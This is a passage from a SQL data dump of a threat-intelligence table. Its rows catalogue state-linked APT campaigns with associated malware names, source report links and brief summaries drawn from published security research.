APT targeting users in the Middle East','Molerats','https://www.zscaler.com/blogs/security-research/new-espionage-attack-molerats-apt-targeting-users-middle-east',NULL,'In December 2021, researchers identified several macro-based MS office files uploaded from Middle Eastern countries such as Jordan to OSINT sources such as VT. These files contained decoy themes related to geo-political conflicts between Israel and Palestine. Such themes have been used in previous attack campaigns waged by the Molerats APT.','2022-01-24 19:01:00','2022-02-23 00:00:33','61ee85024b3758a4a953a386'),(762,12,'APT 27 group  targets German commercial companies','HyperBro - S0398','https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2022-01-bfv-cyber-brief.pdf?__blob=publicationFile&v=10',NULL,'The Federal Office for the Protection of the Constitution (BfV) has information about an ongoing cyber espionage campaign by the cyber attack group APT27 using the malware variant HYPERBRO against German commercial companies. According to current knowledge, the attackers have been exploiting vulnerabilities in Microsoft Exchange and in the Zoho AdSelf Service Plus1 software since March 2021 as a gateway for the attacks.','2022-01-27 19:01:17','2022-02-26 00:02:44','61f25b04c2ba95edb6ef1753'),(763,12,'North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(764,6,'Log4j exploit hits again: vulnerable Unifi Network application (Ubiquiti)','Trojan:Win32/Cobaltstrike','https://blog.morphisec.com/log4j-exploit-targets-vulnerable-unifi-network-applications',NULL,'Morphisec researchers have identified Unifi Network applications being targeted on a number of occasions. Based on prevention logs from Morphisec, the first appearance of successful exploitation occurred on January 20, 2022. The uniqueness of the attack is that the C2 is correlated to a previous SolarWind attack as reported by CrowdStrike.','2022-01-31 19:02:21','2022-03-02 00:01:46','61f80e6ba4f4889784b007e0'),(766,10,'Ugg Boots 4 Sale: A Tale of Palestinian-Aligned Espionage','NimbleMamba,BrittleBush','https://www.proofpoint.com/us/blog/threat-insight/ugg-boots-4-sale-tale-palestinian-aligned-espionage',NULL,'In late 2021, Proofpoint analysts identified a complex attack chain targeting Middle Eastern governments, foreign policy think tanks, and a state-affiliated airline. Over three months, Proofpoint observed three subtle variations of this attack chain. Proofpoint attributes these campaigns to TA402, an actor commonly tracked as Molerats and believed to be operating in the interest of the Palestinian Territories. Based on Proofpoint’s research, TA402 is a persistent threat to organizations and governments in the Middle East, routinely updating not only their malware implants, but also their delivery methods.','2022-02-08 19:02:19','2022-02-15 07:07:22','6202a3f984b0c0b13f2c88f8'),(767,30,'Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks','MuddyWater,POWERSTATS,Small Sieve,Starwhale,PowGoop','https://www.cisa.gov/uscert/ncas/alerts/aa22-055a',NULL,'A group of Iranian government-sponsored advanced persistent threat actors, known as MuddyWater, are conducting cyber espionage and other malicious cyber operations against global government and commercial networks, the US Department of Homeland Security (DoH) has warned.','2022-02-28 19:01:13','2022-03-30 00:00:10','621cf48c69b2caf2c2f4bb3e'),(768,52,'Iranian linked conglomerate MuddyWater comprised of regionally focused subgroups','MuddyWater,WSF,SloughRAT','https://blog.talosintelligence.com/2022/03/iranian-supergroup-muddywater.html',NULL,'Cisco Talos has identified new cyber attacks targeting Turkey, the Arabian peninsula and other Asian countries from an Iranian-linked group known as MuddyWater, which is believed to be operating under the same umbrella of threat actors.','2022-03-10 19:01:09','2022-04-09 00:00:32','622a1df4039af2610815beff'),(769,34,'Lazarus Trojanized DeFi app for delivering malware',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(797,35,'Cyber ​​attack of UAC-0010 group (Armageddon) on state organizations of Ukraine',NULL,'https://cert.gov.ua/article/39386',NULL,'The Governmental Team for Response to Computer Emergencies of Ukraine CERT-UA received an e-mail from the coordinating subject with the subject \"№1275 from 07.04.2022\", containing the HTML file of the same name, the opening of which will lead to the creation of an archive on the computer \" 1275_07.04.2022.rar \". The latter contains an LNK file \"On the facts of persecution and murder of prosecutors by the Russian military in the temporarily occupied territories.lnk\", the opening of which will lead to the download and launch of the payload.','2022-04-24 19:56:09','2022-05-08 00:03:14','624ff5fdc775e84ef8bd5850'),(798,323,'Shuckworm: Espionage Group Continues Intense Campaign Against Ukraine','Pterodo,UltraVNC','https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-intense-campaign-ukraine,https://github.com/Symantec/threathunters/blob/main/Shuckworm/host,https://github.com/Symantec/threathunters/blob/main/Shuckworm/network',NULL,'Four different variants of the Shuckworm malware have been used in recent attacks on organisations in Ukraine, according to security firm Symantec, who has been working with the group for more than two years.','2022-04-24 19:56:09','2022-07-01 00:00:49','62610ab30fb80646c658cf3f'),(880,12,'Operation RestyLink: Targeted attack campaign targeting Japanese companies','Cobalt Strike - S0154','https://insight--jp-nttsecurity-com.translate.goog/post/102ho8o/operation-restylink?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en',NULL,'Since mid- April 2022 , multiple organizations have been observing targeted attack campaigns targeting Japanese companies. This attack campaign is believed to have been active in March 2022 , and it is possible that a related attack was also underway in October 2021 . For this reason, it is possible that attacks will continue in the future, rather than short-term, one-off attack campaigns.','2022-05-29 19:48:57','2022-06-10 00:04:38','627b9aa3b3842d989f57bfe6'),(881,1,'MyTest Attack','','','','','2022-05-30 06:38:03','2022-05-30 06:38:03',NULL),(1178,3,'OilRig, Helix Kitten, GreenBug, IRN2',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1213,0,'A Dual Espionage and Cyber Crime Operation','Associated malware: APT41 has been observed using at least 46 different code families and tools.\n\n','','APT41 often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.',' APT41 is a prolific cyber threat group that carries out Chinese state-sponsored espionage activity in addition to financially motivated activity potentially outside of state control.','2022-08-23 06:02:24','2022-08-23 06:02:24',NULL),(1250,0,'APT27 Cyber operations','1. spear phishing as its initial compromise method\n2. APT27 actors used a compromised account at one victim organization to send a spear phishing email to other intended victims in the similar industries. Additionally, APT27 may compromise vulnerable web applications in order to gain an initial foothold.','','','Associated malware: PANDORA, SOGU, ZXSHELL, GHOST, WIDEBERTH, QUICKPULSE, FLOWERPOT','2022-08-29 03:48:05','2022-08-29 03:48:05',NULL),(1372,38,'MuddyWater\'s light first-stager targetting Middle East',NULL,'https://lab52.io/blog/muddywaters-light-first-stager-targetting-middle-east/',NULL,'The MuddyWater threat group, allegedly sponsored by the Iranian government, has been carrying out a long-term infection campaign targeting countries in the Middle East, according to an analysis by S2 Grupo Home.','2022-09-21 19:54:29','2022-12-09 00:03:21','62b1bfcf88e55b6f69deb3bc'),(1373,451,'RedAlpha Conducts Multi-Year Credential Theft Campaign Targeting Global Humanitarian, Think Tank, and Government Organizations',NULL,'https://raw.githubusercontent.com/Insikt-Group/Research/9571bd788b9ca122ffa8078a3e562da0ebe566b1/RedAlpha%20-%20June%202022/RedAlpha%20June%202022%20Indicators.txt,https://go.recordedfuture.com/hubfs/reports/ta-2022-0816.pdf',NULL,'Over the past 3 years, Recorded Future have observed RedAlpha registering\nand weaponizing hundreds of domains spoofing organizations\nsuch as the International Federation for Human Rights (FIDH),\nAmnesty International, the Mercator Institute for China Studies\n(MERICS), Radio Free Asia (RFA), the American Institute in Taiwan\n(AIT), and other global government, think tank, and humanitarian\norganizations that fall within the strategic interests of the Chinese\ngovernment. Historically, the group has also engaged in direct\ntargeting of ethnic and religious minorities, including individuals\nand organizations within Tibetan and Uyghur communities. As\nhighlighted within this report, in recent years RedAlpha has also\ndisplayed a particular interest in spoofing political, government,\nand think tank organizations in Taiwan, likely in an effort to\ngather political intelligence.','2022-09-21 20:23:43','2022-08-17 12:48:11','62fce38c1455a7d74ea783dd'),(1598,43,'Lazarus Targets Chemical Sector',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1599,48,'TraderTraitor: North Korean State-Sponsored APT Targets Blockchain Companies',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1600,21,'VSingle malware obtains C2 server information from GitHub',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1601,5,'YamaBot Malware Used by Lazarus',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1602,23,'Comprehensive Threat Intelligence: MagicRAT: Lazarus&#8217',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1603,7,'Lazarus ‘Operation In(ter)ception’ Targets macOS Users Dreaming of Jobs in Crypto',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1604,27,'Amazon-themed campaigns of Lazarus in the Netherlands and Belgium',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1605,15,'Agent Tesla RAT Delivered by Quantum Builder With New TTPs',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1606,23,'Gamaredon activity - Second Quarter 2022',NULL,'https://twitter.com/500mk500/status/1534799900147339267,https://twitter.com/500mk500/status/1534804600246648832',NULL,'IOCs related to Gamaredon activity during the second quarter of 2022','2022-10-17 19:04:14','2022-07-09 00:01:52','62a1bf5273a6c5f00e51cc45'),(1607,65,'Shuckworm: Russia-Linked Group Maintains Ukraine Focus','Giddome','https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/russia-ukraine-shuckworm',NULL,'Recent Shuckworm activity observed and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted by CERT-UA on July 26.','2022-10-17 19:04:14','2022-08-16 09:47:16','62fb67a52633a505e1b26dc9'),(1608,56,'Gamaredon APT targets Ukrainian government agencies in new campaign',NULL,'https://blog.talosintelligence.com/2022/09/gamaredon-apt-targets-ukrainian-agencies.html',NULL,'Cisco Talos discovered Gamaredon APT activity targeting users in Ukraine with malicious LNK files distributed in RAR archives. The campaign, part of an ongoing espionage operation observed as recently as August 2022, aims to deliver information-stealing malware to Ukrainian victim machines and makes heavy use of multiple modular PowerShell and VBScript (VBS) scripts as part of the infection chain. The infostealer is a dual-purpose malware that includes capabilities for exfiltrating specific file types and deploying additional binary and script-based payloads on an infected endpoint.','2022-10-17 19:04:14','2022-10-19 12:03:16','632867cb6adb2944df19a4e8'),(1958,0,'APT Judgement Panda Lookup','','','','','2023-02-08 08:02:15','2023-02-08 08:02:15',NULL),(1959,28,'APT-C-35: New Windows Framework Revealed',NULL,'https://blog.morphisec.com/apt-c-35-new-windows-framework-revealed',NULL,'The DoNot Team, an advanced persistent threat actor known as APT-C-35, has released a series of updates to the Windows framework, which they use to launch attacks on South Asia.','2023-02-13 05:35:10','2022-09-11 00:00:26','62f648b31fe2879c2b77729a'),(1960,44,'Disclosure of APT-C-35\'s recent attack activities',NULL,'https://mp.weixin.qq.com/s/rslBGQgTL_jZD73AJqI05Q',NULL,'APT-C-35 (Brainworm), also known as Donot, is an overseas APT organization from South Asia. They mainly conduct cyber espionage activities against government agencies in Pakistan and neighboring countries and regions, mainly to steal sensitive information. The APT-C-35 organization uses PPT or XLS files as attack vectors. When the victim opens the malicious file, it will immediately release a compressed file and a batch file, and create 3 scheduled tasks.','2023-02-13 05:35:10','2023-02-08 15:36:33','63e3c1389af0d0a79538e143'),(1961,4,'APT-C-35\' alias \'Sector E-02\'','The group has been known to use a variety of malware, including remote access trojans (RATs), keyloggers, and data exfiltration tools.','cyber espionage group','Malware','Pak\'s NTISB/ Cabinet Division issues a cyber security advisory on \'DO NOT\' APT Group alias \'APT-C-35\' alias \'Sector E-02\'. The advisory claims this malware \"exfiltrates data to Indian intellience agencies\".','2023-02-13 05:53:03','2023-02-13 10:05:01',NULL),(1962,50,'Hurrican Panda','HURRICANE PANDA\'s preferred initial vector of compromise and persistence is a China Chopper webshell – a tiny and easily obfuscated 70 byte text file that consists of an ‘eval()’ command, which is then used to provide full command execution and file upload/download capabilities to the attackers. This script is typically uploaded to a web server via a SQL injection or WebDAV vulnerability, which is often trivial to uncover in a company with a large external web presence. Once inside, the adversary immediately moves on to execution of a credential theft tool such as Mimikatz (repacked to avoid AV detection). If they are lucky to have caught an administrator who might be logged into that web server at the time, they will have gained domain administrator credentials and can now roam your network at will via ‘net use’ and ‘wmic’ commands executed through the webshell terminal.','China','','We have investigated their intrusions since 2013 and have been battling them nonstop over the last year at several large telecommunications and technology companies. The determination of this China-based adversary is truly impressive: they are like a dog with a bone. ','2023-02-14 20:31:54','2023-02-16 14:42:48',NULL),(1963,7,'admin@338','Systeminfo, PoisonIvy, netstat, Net, LOWBALL, ipconfig, BUBBLEWRAP.','','','admin@338 is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as PoisonIvy, as well as some non-public backdoors.','2023-02-20 15:32:38','2023-02-20 15:32:38',NULL),(1964,114,'APT-C-36: Continuous Attacks Targeting Colombian Government Institutions and Corporations',NULL,'https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/',NULL,'Since April 2018, an APT group (Blind Eagle, APT-C-36) suspected coming from South America carried out continuous targeted attacks against Colombian government institutions as well as important corporations in financial sector, petroleum industry, professional manufacturing, etc.\n\nTill this moment, 360 Threat Intelligence Center captured 29 bait documents, 62 Trojan samples and multiple related malicious domains in total. Attackers are targeting Windows platform and aiming at government institutions as well as big companies in Colombia.','2023-02-20 16:47:28','2019-02-18 17:36:16','5c6aed104866631cac8227b1'),(1965,13,'Analyzing AsyncRAT distributed in Colombia','AsyncRAT','https://jstnk9.github.io/jstnk9/research/AsyncRAT-Analysis/',NULL,'A sample of AsyncRAT, a piece of malware used by the APT-C-36 cybercriminal group, has been analysed by Jose Luis Sánchez Martínez.','2023-02-20 16:47:28','2022-06-02 09:28:21','629882b66db1fe4990979da6'),(1966,22,'BlindEagle Targeting Ecuador With Sharpened Tools','Quasar RAT','https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/',NULL,'An APT-C-36 group cyber-attack on Ecuador has been observed for the last few months, and the latest research by Check Point Research suggests that the group is developing a more advanced toolset.','2023-02-20 16:47:28','2023-01-09 19:05:44','63bc6589eca837694cb9fb99'),(1967,22,'Phishing Attacks Against Ecuador','Backdoor:MSIL/Quasar','https://mp.weixin.qq.com/s/6TkOV11WvlCZX84-wszTJQ',NULL,'APT-C-36, also known as Blind Eagle, is an APT organization driven by economic interests. Since 2018, the group has been launching indiscriminate cyberattacks against citizens across South America. In a recent Blind Eagle campaign targeting Ecuadorian groups, researchers detected a new infection chain involving a more advanced toolset. Unlike the group\'s usual methods, the backdoor chosen for this attack is often used for espionage.','2023-02-20 16:47:28','2023-02-06 16:27:02','63e12a11def97eb58ad48749'),(1968,115,'APT-C-36 Continuous Attacks Targeting Colombian Government Institutions and Corporations','Imminent Monitor','https://web.archive.org/web/20190625182633if_/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/',NULL,'APT-C-36 is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing.','2023-02-20 16:51:06','2023-02-20 17:06:24',NULL),(1969,49,'Ajax Security Team','','US defense','','Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.[1]','2023-02-24 14:31:52','2023-02-24 14:31:52',NULL),(1970,41,'New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit',NULL,'https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html',NULL,'We believe APT34 is involved in a long-term cyber espionage operation largely focused on reconnaissance efforts to benefit Iranian nation-state interests and has been operational since at least 2014. This threat group has conducted broad targeting across a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. The full report on APT34 is available to our MySIGHT customer community.','2023-02-27 14:36:15','2018-04-24 19:43:17','5a29809ac5ea9f0cbb6a9c07'),(1971,35,'Hard Pass: Declining APT34’s Invite to Join Their Professional Network',NULL,'https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html,https://twitter.com/kyleehmke/status/1151944337598668801',NULL,'In late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor.','2023-02-27 14:36:15','2019-09-12 10:46:30','5d3092fc4cd930e8cd6b1f76'),(1972,6,'Iranian Campaign Tailored to US Companies Utilizes an Updated Toolset','TONEDEAF','https://intezer.com/blog-new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/',NULL,'Intezer researchers Paul Litvak and Michael Kajilolti have discovered a new campaign conducted by APT34 employing an updated toolset. Based on uncovered phishing documents, we believe this Iranian actor is targeting Westat employees, or United States organizations hiring Westat services.','2023-02-27 14:36:15','2020-01-30 19:13:41','5e332a6529434a41c4f22c8c'),(1973,7,'APT34 Attacks Lebanon Government',NULL,'https://blog.telsy.com/apt34-aka-oilrig-attacks-lebanon-government-entities-with-maildropper-implant/,https://twitter.com/silv0123/status/1235452703179829248',NULL,'\"Very recently another custom malicious implant that seems to be related to APT34 (aka OilRig) has been uploaded to a major malware analysis platform. Since 2014, year in which FireEye spotted out this hacking group, APT34 is well-known to conduct cyber operations primarily in the Middle East, mainly targeting financial, government, energy, chemical and telecommunications sector.\"','2023-02-27 14:36:15','2020-03-05 17:43:32','5e5e7f314819d655ba379ae6'),(1974,10,'Iran’s APT34 Returns with an Updated Arsenal','SideTwist','https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/',NULL,'Check Point Research discovered evidence of a new campaign by the Iranian threat group APT34 (aka OilRig), against what appears to be a Lebanese target, employing a new backdoor variant dubbed SideTwist.','2023-02-27 14:36:15','2021-04-08 16:51:06','606f347aadebd8f4dd043ac9'),(1975,34,'Ongoing Campaign Leveraging Exchange Vulnerability Potentially Linked to Iran','China Chopper - S0020,RGDoor - S0258,HighShell,Mimikatz - S0002','https://www.secureworks.com/blog/ongoing-campaign-leveraging-exchange-vulnerability-potentially-linked-to-iran',NULL,'During a threat hunting engagement in April 2021, incident responders identified web shells on multiple hosts in a customer’s environment, as well as other evidence of post-exploitation activity. Subsequent analysis revealed a previous compromise of SharePoint servers within the environment, as well as ongoing activity initially facilitated by the compromise of on-premises Exchange servers. Analysis indicates that the two sets of activity were unrelated and were conducted by different threat groups.','2023-02-27 14:36:15','2021-08-20 00:01:27','60f82394e6c1b7c6ec7b9978'),(1976,18,'APT34 targets Jordan Government using new Saitama backdoor','Saitama','https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor/,https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt',NULL,'On April 26th, Malwarebytes Labs identified a suspicious email that targeted a government official from Jordan’s foreign ministry. The email contained a malicious Excel document that drops a new backdoor named Saitama. Following our investigation, we were able to attribute this attack to the known Iranian Actor APT34.','2023-02-27 14:36:20','2022-06-11 00:03:07','627ce7ceecf262a2aff36f9f'),(1977,5,'New APT34 Malware Targets The Middle East','Saitama,Karkoff','https://www.trendmicro.com/en_us/research/23/b/new-apt34-malware-targets-the-middle-east.html',NULL,'Trend Micro analyzed an infection campaign targeting organizations in the Middle East for cyberespionage in December 2022 using a new backdoor malware. The campaign abuses legitimate but compromised email accounts to send stolen data to external mail accounts controlled by the attackers.','2023-02-27 14:36:20','2023-02-03 19:44:26','63dd641b12db5f01c265bce1'),(1978,0,'APT34','Trend Micro','https://www.trendmicro.com/en_us/research/23/b/new-apt34-malware-targets-the-middle-east.html','We found the initial stage .Net dropper malware called MrPerfectInstaller (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) responsible for dropping four different files, with each component stored in a Base64 buffer inside the main dropper. ','We analyze an infection campaign targeting organizations in the Middle East for cyberespionage in December 2022 using a new backdoor malware. The campaign abuses legitimate but compromised email accounts to send stolen data to external mail accounts controlled by the attackers.','2023-02-27 14:43:01','2023-02-27 14:43:01',NULL),(1979,0,'WannaCry Ransomware Attack',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(1980,346,'Aoqin Dragon | Newly-Discovered Chinese-linked APT Has Been Quietly Spying On Organizations For 10 Years','Mongall,Heyoka','https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/',NULL,'SentinelLabs has uncovered a cluster of activity beginning at least as far back as 2013 and continuing to the present day, primarily targeting organizations in Southeast Asia and Australia. SentinelLabs assess that the threat actor’s primary focus is espionage and relates to targets in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. SentinelLabs track this activity as ‘Aoqin Dragon’.','2023-02-28 17:19:04','2022-07-09 00:01:52','62a2000d48968523834dd8b9'),(1981,237,'Aoqin Dragon','Heyoka Backdoor, Mongall','https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/','','Aoqin Dragon is a suspected Chinese cyber espionage threat group that has been active since at least 2013. Aoqin Dragon has primarily targeted government, education, and telecommunication organizations in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. Security researchers noted a potential association between Aoqin Dragon and UNC94, based on malware, infrastructure, and targets.','2023-02-28 17:22:15','2023-02-28 17:22:15',NULL),(1982,0,'APT 18','','','','','2023-03-10 13:22:21','2023-03-10 13:22:21',NULL),(1983,17,'APT18','phishing, gh0st RAT, cmd, powershell, Pisloader, HTTPBrowser, hcdLoader, gh0st RAT.','http://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/\nhttps://published-prd.lanyonevents.com/published/rsaus17/sessionsFiles/5009/HTA-F02-Detecting-and-Responding-to-Advanced-Threats-within-Exchange-Environments.pdf\nhttps://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/\nhttps://www.anomali.com/blog/evasive-maneuvers-the-wekby-group-attempts-to-evade-analysis-via-custom-rop\nhttps://www.threatstream.com/blog/evasive-maneuvers-the-wekby-group-attempts-to-evade-analysis-via-custom-rop\n','G0026','APT18 is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical.','2023-03-10 13:29:38','2023-03-10 13:29:38',NULL),(1984,10,'APT 12','